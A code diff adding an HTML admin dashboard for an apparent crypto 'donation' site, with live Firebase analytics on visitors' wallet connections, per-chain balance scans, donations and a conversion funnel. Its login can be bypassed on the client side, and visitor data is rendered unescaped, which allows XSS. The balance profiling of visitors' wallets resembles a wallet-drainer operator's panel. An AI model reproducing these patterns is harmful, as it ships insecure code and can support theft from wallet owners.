@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel — Crypto Donation</title>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
+    <script src="config.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Inter',sans-serif;background:#0a0a12;color:#e2e8f0;min-height:100vh;}
+
+        .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
+        .login-box{background:#13131d;border:1px solid rgba(255,255,255,0.06);border-radius:20px;padding:40px;max-width:380px;width:100%;text-align:center;}
+        .login-box h2{font-size:20px;margin-bottom:8px;}
+        .login-box p{font-size:13px;color:rgba(255,255,255,0.4);margin-bottom:24px;}
+        .login-box input{width:100%;padding:14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;font-size:15px;outline:none;margin-bottom:16px;font-family:inherit;text-align:center;}
+        .login-box input:focus{border-color:rgba(99,102,241,0.5);}
+        .login-box button{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;}
+        .login-box .err{color:#f87171;font-size:12px;margin-top:8px;display:none;}
+
+        .dashboard{display:none;max-width:1200px;margin:0 auto;padding:20px;}
+        .dash-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px;}
+        .dash-header h1{font-size:22px;font-weight:700;}
+        .dash-header .meta{font-size:12px;color:rgba(255,255,255,0.3);}
+        .dash-actions{display:flex;gap:8px;flex-wrap:wrap;}
+        .dash-actions button{padding:8px 16px;border-radius:10px;border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.04);color:#e2e8f0;font-size:12px;cursor:pointer;font-family:inherit;transition:all .15s;}
+        .dash-actions button:hover{background:rgba(255,255,255,0.08);}
+        .dash-actions .btn-accent{background:linear-gradient(135deg,#6366f1,#4f46e5);border:none;color:#fff;font-weight:600;}
+        .live-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;margin-right:6px;animation:pulse 2s infinite;}
+        @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
+
+        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px;}
+        .stat-card{background:#13131d;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:20px;}
+        .stat-card .label{font-size:11px;font-weight:600;color:rgba(255,255,255,0.35);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;}
+        .stat-card .value{font-size:28px;font-weight:800;color:#a5b4fc;}
+        .stat-card .sub{font-size:11px;color:rgba(255,255,255,0.3);margin-top:4px;}
+        .stat-card.green .value{color:#4ade80;}
+        .stat-card.yellow .value{color:#fbbf24;}
+        .stat-card.red .value{color:#f87171;}
+
+        .charts-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px;}
+        @media(max-width:768px){.charts-row{grid-template-columns:1fr;}}
+        .chart-box{background:#13131d;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:20px;}
+        .chart-box h3{font-size:14px;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.7);}
+        .chart-box canvas{max-height:240px;}
+
+        .table-box{background:#13131d;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:20px;margin-bottom:24px;overflow-x:auto;}
+        .table-box h3{font-size:14px;font-weight:600;margin-bottom:16px;color:rgba(255,255,255,0.7);}
+        table{width:100%;border-collapse:collapse;font-size:12px;}
+        th{text-align:left;padding:8px 12px;color:rgba(255,255,255,0.4);font-weight:600;border-bottom:1px solid rgba(255,255,255,0.06);font-size:10px;text-transform:uppercase;letter-spacing:0.5px;}
+        td{padding:8px 12px;border-bottom:1px solid rgba(255,255,255,0.03);color:rgba(255,255,255,0.7);}
+        tr:hover td{background:rgba(255,255,255,0.02);}
+        .tag{display:inline-block;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:600;}
+        .tag-green{background:rgba(34,197,94,0.12);color:#4ade80;}
+        .tag-blue{background:rgba(99,102,241,0.12);color:#818cf8;}
+        .tag-red{background:rgba(239,68,68,0.12);color:#f87171;}
+        .tag-yellow{background:rgba(251,191,36,0.12);color:#fbbf24;}
+        .tag-gray{background:rgba(255,255,255,0.06);color:rgba(255,255,255,0.4);}
+        .addr{font-family:monospace;font-size:11px;color:rgba(255,255,255,0.5);}
+
+        .tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap;}
+        .tab{padding:8px 16px;border-radius:10px;font-size:12px;font-weight:500;cursor:pointer;color:rgba(255,255,255,0.4);transition:all .15s;border:1px solid transparent;}
+        .tab:hover{color:#e2e8f0;background:rgba(255,255,255,0.04);}
+        .tab.active{background:rgba(99,102,241,0.15);color:#a5b4fc;border-color:rgba(99,102,241,0.2);}
+
+        .loading{text-align:center;padding:60px 20px;color:rgba(255,255,255,0.3);font-size:14px;}
+        .loading .spin{display:inline-block;width:20px;height:20px;border:2px solid rgba(255,255,255,0.1);border-top-color:#6366f1;border-radius:50%;animation:sp .7s linear infinite;margin-right:8px;vertical-align:middle;}
+        @keyframes sp{to{transform:rotate(360deg)}}
+        .empty{text-align:center;padding:40px;color:rgba(255,255,255,0.2);font-size:13px;}
+
+        .bal-token{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:6px;font-size:10px;margin:1px 2px;font-family:monospace;}
+        .bal-pos{background:rgba(34,197,94,0.1);color:#4ade80;}
+        .bal-zero{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.25);}
+        .wallet-card{background:#13131d;border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:10px;}
+        .wallet-card .wc-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-wrap:wrap;gap:8px;}
+        .wallet-card .wc-addr{font-family:monospace;font-size:13px;color:#a5b4fc;font-weight:600;}
+        .wallet-card .wc-meta{font-size:11px;color:rgba(255,255,255,0.3);}
+        .wallet-card .wc-balances{display:flex;flex-wrap:wrap;gap:4px;}
+        .new-flash{animation:flashNew 2s ease-out;}
+        @keyframes flashNew{0%{background:rgba(99,102,241,0.2);border-color:rgba(99,102,241,0.4);}100%{background:#13131d;border-color:rgba(255,255,255,0.06);}}
+    </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="login-wrap" id="loginWrap">
+    <div class="login-box">
+        <h2>Admin Panel</h2>
+        <p>Введите пароль для доступа к статистике</p>
+        <input type="password" id="passInput" placeholder="Пароль" onkeydown="if(event.key==='Enter')doLogin()">
+        <button onclick="doLogin()">Войти</button>
+        <div class="err" id="loginErr">Неверный пароль</div>
+    </div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="dashboard" id="dashboard">
+    <div class="dash-header">
+        <div>
+            <h1><span class="live-dot"></span> Dashboard</h1>
+            <div class="meta">Crypto Donation Admin Panel — real-time</div>
+        </div>
+        <div class="dash-actions">
+            <button onclick="loadData()">Обновить</button>
+            <button onclick="exportCSV()" class="btn-accent">Export CSV</button>
+            <button onclick="doLogout()">Выйти</button>
+        </div>
+    </div>
+
+    <div class="loading" id="loadingState"><span class="spin"></span> Загрузка данных...</div>
+
+    <div id="dashContent" style="display:none">
+        <div class="stats-grid" id="statsGrid"></div>
+
+        <div class="charts-row">
+            <div class="chart-box">
+                <h3>Активность по дням</h3>
+                <canvas id="chartTimeline"></canvas>
+            </div>
+            <div class="chart-box">
+                <h3>Кошельки</h3>
+                <canvas id="chartWallets"></canvas>
+            </div>
+        </div>
+        <div class="charts-row">
+            <div class="chart-box">
+                <h3>Сети</h3>
+                <canvas id="chartChains"></canvas>
+            </div>
+            <div class="chart-box">
+                <h3>Устройства</h3>
+                <canvas id="chartDevices"></canvas>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" data-tab="wallets" onclick="showTab('wallets')">Кошельки и балансы</div>
+            <div class="tab" data-tab="events" onclick="showTab('events')">Все события</div>
+            <div class="tab" data-tab="sessions" onclick="showTab('sessions')">Сессии</div>
+            <div class="tab" data-tab="connects" onclick="showTab('connects')">Подключения</div>
+            <div class="tab" data-tab="donations" onclick="showTab('donations')">Донаты</div>
+            <div class="tab" data-tab="funnel" onclick="showTab('funnel')">Воронка</div>
+        </div>
+
+        <div class="table-box" id="tabWallets"></div>
+        <div class="table-box" id="tabEvents" style="display:none"></div>
+        <div class="table-box" id="tabSessions" style="display:none"></div>
+        <div class="table-box" id="tabConnects" style="display:none"></div>
+        <div class="table-box" id="tabDonations" style="display:none"></div>
+        <div class="table-box" id="tabFunnel" style="display:none"></div>
+    </div>
+</div>
+
+<script>
+let db = null;
+let allEvents = [];
+let allSessions = {};
+let charts = {};
+let liveListeners = [];
+
+async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+async function doLogin() {
+    const p = document.getElementById('passInput').value;
+    const hash = await sha256(p);
+    if (typeof ADMIN_PASS_HASH !== 'undefined' && hash === ADMIN_PASS_HASH) {
+        document.getElementById('loginWrap').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        sessionStorage.setItem('admin_auth', '1');
+        initFirebase();
+    } else {
+        document.getElementById('loginErr').style.display = 'block';
+    }
+}
+function doLogout() {
+    liveListeners.forEach(fn => fn());
+    sessionStorage.removeItem('admin_auth');
+    location.reload();
+}
+
+if (sessionStorage.getItem('admin_auth') === '1') {
+    document.getElementById('loginWrap').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'block';
+    setTimeout(initFirebase, 100);
+}
+
+function initFirebase() {
+    try {
+        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
+        db = firebase.database();
+        loadData();
+        startLiveUpdates();
+    } catch(e) {
+        document.getElementById('loadingState').innerHTML = '<span style="color:#f87171">Ошибка Firebase. Проверь config.js.</span>';
+    }
+}
+
+function startLiveUpdates() {
+    if (!db) return;
+
+    const evRef = db.ref('events');
+    const sessRef = db.ref('sessions');
+
+    const evCb = evRef.on('child_added', snap => {
+        const ev = {id: snap.key, ...snap.val()};
+        if (!allEvents.find(e => e.id === ev.id)) {
+            allEvents.push(ev);
+            renderDashboard(true);
+        }
+    });
+    liveListeners.push(() => evRef.off('child_added', evCb));
+
+    const sessCb = sessRef.on('value', snap => {
+        allSessions = snap.val() || {};
+    });
+    liveListeners.push(() => sessRef.off('value', sessCb));
+}
+
+async function loadData() {
+    document.getElementById('loadingState').style.display = 'block';
+    document.getElementById('dashContent').style.display = 'none';
+    try {
+        const [evSnap, sessSnap] = await Promise.all([
+            db.ref('events').orderByChild('ts').once('value'),
+            db.ref('sessions').once('value')
+        ]);
+        allEvents = [];
+        evSnap.forEach(s => { allEvents.push({id: s.key, ...s.val()}); });
+        allSessions = sessSnap.val() || {};
+
+        renderDashboard();
+    } catch(e) {
+        document.getElementById('loadingState').innerHTML = '<span style="color:#f87171">Ошибка загрузки: ' + e.message + '</span>';
+    }
+}
+
+function renderDashboard(isLive) {
+    document.getElementById('loadingState').style.display = 'none';
+    document.getElementById('dashContent').style.display = 'block';
+
+    const sessArr = Object.entries(allSessions);
+    const pageViews = allEvents.filter(e => e.event === 'page_view');
+    const connects = allEvents.filter(e => e.event === 'wallet_connect');
+    const declined = allEvents.filter(e => e.event === 'wallet_declined');
+    const netSel = allEvents.filter(e => e.event === 'network_select');
+    const tokSel = allEvents.filter(e => e.event === 'token_select');
+    const donSuccess = allEvents.filter(e => e.event === 'donation_success');
+    const donCancel = allEvents.filter(e => e.event === 'donation_cancelled');
+    const donError = allEvents.filter(e => e.event === 'donation_error');
+    const balScans = allEvents.filter(e => e.event === 'balance_scan');
+
+    const uniqueAddrs = new Set(connects.map(c => c.address).filter(Boolean));
+    const connectRate = pageViews.length > 0 ? ((connects.length / pageViews.length) * 100).toFixed(1) : '0';
+
+    const grid = document.getElementById('statsGrid');
+    grid.innerHTML = '';
+    const stats = [
+        {label: 'Сессии', value: sessArr.length, sub: 'всего посещений'},
+        {label: 'Просмотры', value: pageViews.length, sub: 'page views'},
+        {label: 'Подключений', value: connects.length, sub: uniqueAddrs.size + ' уникальных', cls: 'green'},
+        {label: 'Конверсия', value: connectRate + '%', sub: 'подключения/посещения', cls: 'yellow'},
+        {label: 'Выбор сети', value: netSel.length, sub: 'network select'},
+        {label: 'Выбор токена', value: tokSel.length, sub: 'token select'},
+        {label: 'Успешных донатов', value: donSuccess.length, sub: 'donation success', cls: 'green'},
+        {label: 'Отменено', value: donCancel.length + donError.length, sub: donCancel.length + ' cancel, ' + donError.length + ' error', cls: 'red'},
+        {label: 'Отказов', value: declined.length, sub: 'wallet declined', cls: 'red'},
+        {label: 'Скан балансов', value: balScans.length, sub: balScans.filter(b=>b.hasBalance).length + ' с балансом'},
+    ];
+    stats.forEach(s => {
+        const d = document.createElement('div');
+        d.className = 'stat-card' + (s.cls ? ' ' + s.cls : '');
+        d.innerHTML = `<div class="label">${s.label}</div><div class="value">${s.value}</div><div class="sub">${s.sub}</div>`;
+        grid.appendChild(d);
+    });
+
+    if (!isLive) renderCharts(pageViews, connects, donSuccess, sessArr);
+    renderTables(pageViews, connects, declined, netSel, tokSel, donSuccess, donCancel, donError, balScans, sessArr, isLive);
+}
+
+function renderCharts(pageViews, connects, donSuccess, sessArr) {
+    Object.values(charts).forEach(c => c.destroy());
+    charts = {};
+
+    const days = {};
+    allEvents.forEach(e => {
+        const d = new Date(e.ts).toISOString().slice(0, 10);
+        if (!days[d]) days[d] = {views: 0, connects: 0, donations: 0};
+        if (e.event === 'page_view') days[d].views++;
+        if (e.event === 'wallet_connect') days[d].connects++;
+        if (e.event === 'donation_success') days[d].donations++;
+    });
+    const sortedDays = Object.keys(days).sort();
+    const chartOpts = {responsive: true, plugins: {legend: {labels: {color: 'rgba(255,255,255,0.5)', font: {size: 11}}}}, scales: {x: {ticks: {color: 'rgba(255,255,255,0.3)', font: {size: 10}}, grid: {color: 'rgba(255,255,255,0.03)'}}, y: {ticks: {color: 'rgba(255,255,255,0.3)', font: {size: 10}}, grid: {color: 'rgba(255,255,255,0.03)'}}}};
+
+    charts.timeline = new Chart(document.getElementById('chartTimeline'), {
+        type: 'line',
+        data: {
+            labels: sortedDays,
+            datasets: [
+                {label: 'Просмотры', data: sortedDays.map(d => days[d].views), borderColor: '#818cf8', backgroundColor: 'rgba(129,140,248,0.1)', fill: true, tension: 0.4},
+                {label: 'Подключения', data: sortedDays.map(d => days[d].connects), borderColor: '#4ade80', backgroundColor: 'rgba(74,222,128,0.1)', fill: true, tension: 0.4},
+                {label: 'Донаты', data: sortedDays.map(d => days[d].donations), borderColor: '#fbbf24', backgroundColor: 'rgba(251,191,36,0.1)', fill: true, tension: 0.4},
+            ]
+        },
+        options: chartOpts
+    });
+
+    const walletCounts = {};
+    connects.forEach(c => { const w = c.wallet || 'Unknown'; walletCounts[w] = (walletCounts[w] || 0) + 1; });
+    const wLabels = Object.keys(walletCounts).sort((a, b) => walletCounts[b] - walletCounts[a]);
+    const colors = ['#6366f1', '#8b5cf6', '#a855f7', '#d946ef', '#ec4899', '#f43f5e', '#f97316', '#eab308', '#22c55e', '#14b8a6'];
+
+    charts.wallets = new Chart(document.getElementById('chartWallets'), {
+        type: 'doughnut',
+        data: {
+            labels: wLabels,
+            datasets: [{data: wLabels.map(w => walletCounts[w]), backgroundColor: colors.slice(0, wLabels.length)}]
+        },
+        options: {responsive: true, plugins: {legend: {position: 'bottom', labels: {color: 'rgba(255,255,255,0.5)', font: {size: 10}, padding: 8}}}}
+    });
+
+    const chainCounts = {};
+    allEvents.filter(e => e.event === 'network_select').forEach(e => { const c = e.chainName || e.chain || '?'; chainCounts[c] = (chainCounts[c] || 0) + 1; });
+    const cLabels = Object.keys(chainCounts).sort((a, b) => chainCounts[b] - chainCounts[a]);
+    charts.chains = new Chart(document.getElementById('chartChains'), {
+        type: 'bar',
+        data: {
+            labels: cLabels,
+            datasets: [{label: 'Выборов', data: cLabels.map(c => chainCounts[c]), backgroundColor: 'rgba(99,102,241,0.6)', borderRadius: 6}]
+        },
+        options: {...chartOpts, plugins: {legend: {display: false}}}
+    });
+
+    const mob = sessArr.filter(([, s]) => s.mobile).length;
+    const desk = sessArr.length - mob;
+    charts.devices = new Chart(document.getElementById('chartDevices'), {
+        type: 'doughnut',
+        data: {
+            labels: ['Desktop', 'Mobile'],
+            datasets: [{data: [desk, mob], backgroundColor: ['#6366f1', '#22c55e']}]
+        },
+        options: {responsive: true, plugins: {legend: {position: 'bottom', labels: {color: 'rgba(255,255,255,0.5)', font: {size: 11}}}}}
+    });
+}
+
+function renderTables(pageViews, connects, declined, netSel, tokSel, donSuccess, donCancel, donError, balScans, sessArr, isLive) {
+    renderWalletsTab(connects, balScans, isLive);
+
+    const evTab = document.getElementById('tabEvents');
+    const recent = [...allEvents].reverse().slice(0, 100);
+    evTab.innerHTML = '<h3>Последние 100 событий</h3>';
+    if (recent.length === 0) { evTab.innerHTML += '<div class="empty">Нет событий</div>'; }
+    else {
+        let html = '<table><tr><th>Время</th><th>Событие</th><th>Кошелёк</th><th>Сеть</th><th>Токен</th><th>Адрес</th><th>Детали</th></tr>';
+        recent.forEach(e => {
+            const time = new Date(e.ts).toLocaleString('ru');
+            const tag = eventTag(e.event);
+            html += `<tr><td style="white-space:nowrap;font-size:11px">${time}</td><td>${tag}</td><td>${e.wallet||'—'}</td><td>${e.chainName||e.chain||'—'}</td><td>${e.token||'—'}</td><td class="addr">${e.address ? e.address.slice(0,6)+'...'+e.address.slice(-4) : '—'}</td><td style="font-size:10px;color:rgba(255,255,255,0.3)">${e.amount ? e.amount + ' ' + (e.token||'') : ''} ${e.error||''}</td></tr>`;
+        });
+        html += '</table>';
+        evTab.innerHTML += html;
+    }
+
+    const sessTab = document.getElementById('tabSessions');
+    const sessReverse = [...sessArr].reverse().slice(0, 50);
+    sessTab.innerHTML = '<h3>Последние 50 сессий</h3>';
+    if (sessReverse.length === 0) { sessTab.innerHTML += '<div class="empty">Нет сессий</div>'; }
+    else {
+        let html = '<table><tr><th>Время</th><th>Устройство</th><th>Язык</th><th>Экран</th><th>Источник</th><th>Часовой пояс</th></tr>';
+        sessReverse.forEach(([id, s]) => {
+            const time = new Date(s.start).toLocaleString('ru');
+            const dev = s.mobile ? '<span class="tag tag-green">Mobile</span>' : '<span class="tag tag-blue">Desktop</span>';
+            html += `<tr><td style="white-space:nowrap;font-size:11px">${time}</td><td>${dev}</td><td>${s.lang||'—'}</td><td>${s.screen||'—'}</td><td style="font-size:10px;max-width:200px;overflow:hidden;text-overflow:ellipsis">${s.ref||'—'}</td><td style="font-size:10px">${s.tz||'—'}</td></tr>`;
+        });
+        html += '</table>';
+        sessTab.innerHTML += html;
+    }
+
+    const connTab = document.getElementById('tabConnects');
+    connTab.innerHTML = '<h3>Подключения кошельков</h3>';
+    const allConn = [...connects, ...declined].sort((a, b) => b.ts - a.ts).slice(0, 50);
+    if (allConn.length === 0) { connTab.innerHTML += '<div class="empty">Нет подключений</div>'; }
+    else {
+        let html = '<table><tr><th>Время</th><th>Статус</th><th>Кошелёк</th><th>Адрес</th></tr>';
+        allConn.forEach(e => {
+            const time = new Date(e.ts).toLocaleString('ru');
+            const status = e.event === 'wallet_connect' ? '<span class="tag tag-green">Connected</span>' : '<span class="tag tag-red">Declined</span>';
+            html += `<tr><td style="white-space:nowrap;font-size:11px">${time}</td><td>${status}</td><td>${e.wallet||'—'}</td><td class="addr">${e.address ? e.address.slice(0,6)+'...'+e.address.slice(-4) : '—'}</td></tr>`;
+        });
+        html += '</table>';
+        connTab.innerHTML += html;
+    }
+
+    const donTab = document.getElementById('tabDonations');
+    donTab.innerHTML = '<h3>Донаты</h3>';
+    const allDon = [...donSuccess, ...donCancel, ...donError].sort((a, b) => b.ts - a.ts).slice(0, 50);
+    if (allDon.length === 0) { donTab.innerHTML += '<div class="empty">Нет донатов</div>'; }
+    else {
+        let html = '<table><tr><th>Время</th><th>Статус</th><th>Сумма</th><th>Токен</th><th>Сеть</th><th>Адрес</th></tr>';
+        allDon.forEach(e => {
+            const time = new Date(e.ts).toLocaleString('ru');
+            let status = '<span class="tag tag-gray">?</span>';
+            if (e.event === 'donation_success') status = '<span class="tag tag-green">Success</span>';
+            else if (e.event === 'donation_cancelled') status = '<span class="tag tag-yellow">Cancelled</span>';
+            else if (e.event === 'donation_error') status = '<span class="tag tag-red">Error</span>';
+            html += `<tr><td style="white-space:nowrap;font-size:11px">${time}</td><td>${status}</td><td style="font-weight:600">${e.amount||'—'}</td><td>${e.token||'—'}</td><td>${e.chain||'—'}</td><td class="addr">${e.address ? e.address.slice(0,6)+'...'+e.address.slice(-4) : '—'}</td></tr>`;
+        });
+        html += '</table>';
+        donTab.innerHTML += html;
+    }
+
+    const funTab = document.getElementById('tabFunnel');
+    const steps = [
+        {name: 'Посещение', count: pageViews.length},
+        {name: 'Подключение кошелька', count: connects.length},
+        {name: 'Выбор сети', count: netSel.length},
+        {name: 'Скан баланса', count: balScans.length},
+        {name: 'Выбор токена', count: tokSel.length},
+        {name: 'Попытка доната', count: donSuccess.length + donCancel.length + donError.length},
+        {name: 'Успешный донат', count: donSuccess.length},
+    ];
+    let fhtml = '<h3>Воронка конверсии</h3><table><tr><th>Этап</th><th>Количество</th><th>Конверсия</th><th>Drop-off</th></tr>';
+    steps.forEach((s, i) => {
+        const prev = i > 0 ? steps[i - 1].count : s.count;
+        const conv = prev > 0 ? ((s.count / prev) * 100).toFixed(1) : '—';
+        const drop = prev > 0 ? ((1 - s.count / prev) * 100).toFixed(1) : '0';
+        const bar = prev > 0 ? (s.count / steps[0].count * 100) : 0;
+        fhtml += `<tr><td style="font-weight:500">${s.name}</td><td style="font-weight:700;color:#a5b4fc">${s.count}</td><td><div style="display:flex;align-items:center;gap:8px"><div style="width:60px;height:6px;background:rgba(255,255,255,0.06);border-radius:3px"><div style="width:${bar}%;height:100%;background:#6366f1;border-radius:3px"></div></div><span style="font-size:10px">${i===0?'—':conv+'%'}</span></div></td><td style="font-size:10px;color:${parseFloat(drop)>50?'#f87171':'rgba(255,255,255,0.4)'}">${i===0?'—':drop+'%'}</td></tr>`;
+    });
+    fhtml += '</table>';
+    funTab.innerHTML = fhtml;
+}
+
+function renderWalletsTab(connects, balScans, isLive) {
+    const container = document.getElementById('tabWallets');
+
+    const walletMap = {};
+
+    connects.forEach(e => {
+        if (!e.address) return;
+        const addr = e.address.toLowerCase();
+        if (!walletMap[addr]) walletMap[addr] = {address: e.address, wallet: '', chains: new Set(), scans: [], firstSeen: e.ts, lastSeen: e.ts};
+        walletMap[addr].wallet = e.wallet || walletMap[addr].wallet;
+        walletMap[addr].lastSeen = Math.max(walletMap[addr].lastSeen, e.ts);
+        walletMap[addr].firstSeen = Math.min(walletMap[addr].firstSeen, e.ts);
+    });
+
+    balScans.forEach(e => {
+        if (!e.address) return;
+        const addr = e.address.toLowerCase();
+        if (!walletMap[addr]) walletMap[addr] = {address: e.address, wallet: '', chains: new Set(), scans: [], firstSeen: e.ts, lastSeen: e.ts};
+        walletMap[addr].chains.add(e.chainName || e.chain || '?');
+        walletMap[addr].wallet = e.wallet || walletMap[addr].wallet;
+        walletMap[addr].lastSeen = Math.max(walletMap[addr].lastSeen, e.ts);
+
+        let balances = [];
+        if (e.balances) {
+            try { balances = typeof e.balances === 'string' ? JSON.parse(e.balances) : e.balances; } catch(ex) {}
+        }
+        walletMap[addr].scans.push({
+            chain: e.chainName || e.chain || '?',
+            hasBalance: e.hasBalance,
+            nativeBal: e.nativeBal || '',
+            balances: balances,
+            ts: e.ts
+        });
+    });
+
+    const wallets = Object.values(walletMap).sort((a, b) => b.lastSeen - a.lastSeen);
+
+    let html = `<h3>Кошельки и балансы <span style="font-weight:400;font-size:12px;color:rgba(255,255,255,0.35)">(${wallets.length} адресов)</span></h3>`;
+
+    if (wallets.length === 0) {
+        html += '<div class="empty">Нет просканированных кошельков</div>';
+        container.innerHTML = html;
+        return;
+    }
+
+    wallets.forEach(w => {
+        const shortAddr = w.address.slice(0, 6) + '...' + w.address.slice(-4);
+        const lastTime = new Date(w.lastSeen).toLocaleString('ru');
+        const chains = [...w.chains].join(', ') || '—';
+        const isNew = isLive && (Date.now() - w.lastSeen < 5000);
+
+        html += `<div class="wallet-card${isNew ? ' new-flash' : ''}">`;
+        html += `<div class="wc-head">`;
+        html += `<div><span class="wc-addr">${shortAddr}</span> <span class="tag tag-blue" style="margin-left:6px">${w.wallet || '?'}</span></div>`;
+        html += `<div class="wc-meta">${lastTime} &middot; ${chains}</div>`;
+        html += `</div>`;
+
+        if (w.scans.length > 0) {
+            const latestByChain = {};
+            w.scans.forEach(s => {
+                if (!latestByChain[s.chain] || s.ts > latestByChain[s.chain].ts) latestByChain[s.chain] = s;
+            });
+
+            Object.entries(latestByChain).forEach(([chain, scan]) => {
+                html += `<div style="margin-bottom:6px"><span style="font-size:10px;color:rgba(255,255,255,0.4);font-weight:600">${chain}:</span> `;
+
+                if (scan.balances && scan.balances.length > 0) {
+                    scan.balances.forEach(b => {
+                        const isPos = b.raw > 0 || (b.balance !== '0' && b.balance !== 'error' && !b.balance.startsWith('0'));
+                        html += `<span class="bal-token ${isPos ? 'bal-pos' : 'bal-zero'}">${b.balance} ${b.token}</span>`;
+                    });
+                } else if (scan.nativeBal) {
+                    html += `<span class="bal-token bal-pos">${scan.nativeBal}</span>`;
+                } else {
+                    html += `<span class="bal-token bal-zero">${scan.hasBalance ? 'has balance' : 'empty'}</span>`;
+                }
+                html += `</div>`;
+            });
+        } else {
+            html += `<div style="font-size:11px;color:rgba(255,255,255,0.25)">Баланс не просканирован</div>`;
+        }
+
+        html += `</div>`;
+    });
+
+    container.innerHTML = html;
+}
+
+function eventTag(ev) {
+    const map = {
+        'page_view': ['View', 'tag-gray'],
+        'wallet_connect': ['Connect', 'tag-green'],
+        'wallet_declined': ['Declined', 'tag-red'],
+        'network_select': ['Network', 'tag-blue'],
+        'token_select': ['Token', 'tag-blue'],
+        'balance_scan': ['Scan', 'tag-gray'],
+        'donation_success': ['Donated', 'tag-green'],
+        'donation_cancelled': ['Cancel', 'tag-yellow'],
+        'donation_error': ['Error', 'tag-red'],
+    };
+    const [label, cls] = map[ev] || [ev, 'tag-gray'];
+    return `<span class="tag ${cls}">${label}</span>`;
+}
+
+function showTab(name) {
+    const tabs = ['wallets', 'events', 'sessions', 'connects', 'donations', 'funnel'];
+    tabs.forEach(t => {
+        const el = document.getElementById('tab' + t.charAt(0).toUpperCase() + t.slice(1));
+        if (el) el.style.display = t === name ? 'block' : 'none';
+    });
+    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+    const clicked = document.querySelector(`.tab[data-tab="${name}"]`);
+    if (clicked) clicked.classList.add('active');
+}
+
+function exportCSV() {
+    if (allEvents.length === 0) return alert('Нет данных для экспорта');
+    const headers = ['Время', 'Событие', 'Кошелёк', 'Сеть', 'Токен', 'Сумма', 'Адрес', 'Сессия', 'UserAgent', 'Балансы'];
+    const rows = allEvents.map(e => [
+        new Date(e.ts).toISOString(),
+        e.event, e.wallet || '', e.chain || '', e.token || '', e.amount || '',
+        e.address || '', e.session || '', (e.ua || '').replace(/,/g, ';'),
+        (e.balances || '').replace(/,/g, ';')
+    ]);
+    const csv = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
+    const blob = new Blob(['\uFEFF' + csv], {type: 'text/csv;charset=utf-8;'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'donation_stats_' + new Date().toISOString().slice(0, 10) + '.csv';
+    a.click();
+}
+</script>
+</body>
+</html>
